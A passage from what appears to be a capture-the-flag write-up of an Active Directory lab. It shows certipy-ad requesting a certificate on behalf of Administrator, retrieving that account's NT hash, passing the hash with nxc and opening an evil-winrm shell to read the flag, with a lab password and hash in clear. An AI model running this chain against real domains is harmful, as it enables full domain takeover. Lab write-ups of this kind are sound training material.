+[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '10.0.30.30'
+[+] DC IP: '10.0.30.30'
+[+] DC Host: 'SHADOWGATE.LOCAL'
+[+] Target IP: None
+[+] Remote Name: 'SG-DC01.shadowgate.local'
+[+] Domain: 'SHADOWGATE.LOCAL'
+[+] Username: 'SAM.H'
+[+] Trying to resolve 'SG-DC01.shadowgate.local' at '10.0.30.30'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Checking for Kerberos ticket cache
+[+] Getting TGT for 'SAM.H'@'SHADOWGATE.LOCAL'
+[+] Got TGT for 'SAM.H'@'SHADOWGATE.LOCAL'
+[+] Getting TGS for 'HOST/SG-DC01.shadowgate.local'
+[+] Got TGS for 'HOST/SG-DC01.shadowgate.local'
+[+] Trying to connect to endpoint: ncacn_np:10.0.30.30[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.0.30.30[\pipe\cert]
+[*] Request ID is 7
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'sam.h@shadowgate.local'
+[+] Found SID in security extension: 'S-1-5-21-2396436576-3267128377-3646372360-1114'
+[*] Certificate object SID is 'S-1-5-21-2396436576-3267128377-3646372360-1114'
+[*] Saving certificate and private key to 'sam.h.pfx'
+[+] Attempting to write data to 'sam.h.pfx'
+[+] Data written to 'sam.h.pfx'
+[*] Wrote certificate and private key to 'sam.h.pfx'
+```
+
+```shellscript
+certipy-ad req \ 
+    -u 'sam.h@shadowgate.local' -p 'Valentino1@' \
+    -dc-ip '10.0.30.30' -target 'SG-DC01.shadowgate.local' \
+    -ca 'Shadowgate-CA' -template 'User' \
+    -on-behalf-of 'SHADOWGATE\Administrator' \
+    -pfx 'sam.h.pfx' -ldap-scheme ldap -debug -k
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[!] KRB5CCNAME environment variable not set
+[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '10.0.30.30'
+[+] DC IP: '10.0.30.30'
+[+] DC Host: 'SHADOWGATE.LOCAL'
+[+] Target IP: None
+[+] Remote Name: 'SG-DC01.shadowgate.local'
+[+] Domain: 'SHADOWGATE.LOCAL'
+[+] Username: 'SAM.H'
+[+] Trying to resolve 'SG-DC01.shadowgate.local' at '10.0.30.30'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Checking for Kerberos ticket cache
+[+] Getting TGT for 'SAM.H'@'SHADOWGATE.LOCAL'
+[+] Got TGT for 'SAM.H'@'SHADOWGATE.LOCAL'
+[+] Getting TGS for 'HOST/SG-DC01.shadowgate.local'
+[+] Got TGS for 'HOST/SG-DC01.shadowgate.local'
+[+] Trying to connect to endpoint: ncacn_np:10.0.30.30[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.0.30.30[\pipe\cert]
+[*] Request ID is 8
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator@shadowgate.local'
+[+] Found SID in security extension: 'S-1-5-21-2396436576-3267128377-3646372360-500'
+[*] Certificate object SID is 'S-1-5-21-2396436576-3267128377-3646372360-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[+] Attempting to write data to 'administrator.pfx'
+[+] Data written to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+
+## **Privilege Escalation**
+
+Document how you were able to more laterally and gain a higher privilege
+
+#### **Getting Administrator.pfx**
+
+```shellscript
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.0.30.30 
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator@shadowgate.local'
+[*]     Security Extension SID: 'S-1-5-21-2396436576-3267128377-3646372360-500'
+[*] Using principal: 'administrator@shadowgate.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@shadowgate.local': aad3b435b51404eeaad3b435b51404ee:a07b7bbc98b574afe52bbeb5d07d9c0a
+```
+
+```shellscript
+nxc smb 10.0.30.30 -u 'Administrator' -H aad3b435b51404eeaad3b435b51404ee:a07b7bbc98b574afe52bbeb5d07d9c0a
+SMB         10.0.30.30      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.30.30      445    SG-DC01          [+] shadowgate.local\Administrator:a07b7bbc98b574afe52bbeb5d07d9c0a (Pwn3d!)
+```
+
+```shellscript expandable
+evil-winrm -i 10.0.30.30 -u 'Administrator' -H a07b7bbc98b574afe52bbeb5d07d9c0a
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        12/5/2025   7:08 AM           4788 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+
+FLAG[SamH_Tombstone_Records_NoLongerExists_But_Backups_NeverForget]
+```
